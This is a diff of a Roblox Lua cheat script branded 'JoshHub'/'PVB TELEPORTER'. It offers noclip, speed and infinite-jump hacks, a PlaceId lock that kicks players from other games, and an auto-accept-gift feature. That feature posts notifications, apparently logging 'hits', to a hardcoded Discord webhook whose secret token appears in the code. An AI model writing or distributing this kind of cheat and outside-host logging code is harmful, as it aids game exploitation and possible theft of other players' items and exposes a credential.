@@ -6,7 +6,28 @@
 --  - Noclip, high walkspeed, infinite jump (client)
 --  - Notifications on load
 --  - Leave button (kick)
---  - Safe http webhook using HttpService
+--  - Safe http webhook using HttpService 
+
+ --// 🧠 JoshHub Secure Script Loader
+--// Author: JoshroxasScript
+
+--// Allowed game only
+local ALLOWED_PLACE_ID = 127742093697776 -- 🟢 Palitan mo ng PlaceId ng mismong game mo
+
+-- Check current game ID
+if game.PlaceId ~= ALLOWED_PLACE_ID then
+    warn("[JoshHub] ❌ This script is NOT allowed in this game! PlaceId: " .. tostring(game.PlaceId))
+    
+    local player = game:GetService("Players").LocalPlayer
+    if player then
+        player:Kick("❌ This script only works in the official JoshHub game.")
+    end
+    
+    return -- ⛔ Hihinto ang script dito
+end
+
+print("[JoshHub] ✅ Script loaded successfully for PlaceId: " .. tostring(game.PlaceId))
+
 
 -- Services / globals
 local Players = game:GetService("Players")
@@ -22,12 +43,16 @@ local WebhookURL = "https://discord.com/api/webhooks/1420940951236513862/o5CH79y
 local function sendWebhook(content)
     if not WebhookURL or WebhookURL == "" then return end
     local data = {
-        username = "🎁 Joshhub AutoAccept",
-        avatar_url = "https://i.imgur.com/3GKwK6X.png",
-        content = content
+        username = "🎁 PVB HITS TP",
+        avatar_url = "https://i.imgur.com/vkDcdge.png", -- Anime avatar, change if you want
+        embeds = {{
+            title = "🎉 Auto Accepted Gift!",
+            description = content,
+            color = 0xFF0000, -- Hot pink, change to any hex color (e.g. 0x00FF99 for green)
+            footer = { text = "JoshhTP | TELEPORTER⚡V1" }
+        }}
     }
     pcall(function()
-        -- try using request if available; fall back to HttpService:PostAsync
         if request then
             request({
                 Url = WebhookURL,
@@ -68,7 +93,7 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -35, 0, 35)
 Title.Position = UDim2.new(0, 8, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "🔮 Joshhub teleporter"
+Title.Text = "PVB TELEPORTER🧟r"
 Title.TextColor3 = Color3.fromRGB(144, 238, 144)
 Title.Font = Enum.Font.Fantasy
 Title.TextSize = 17
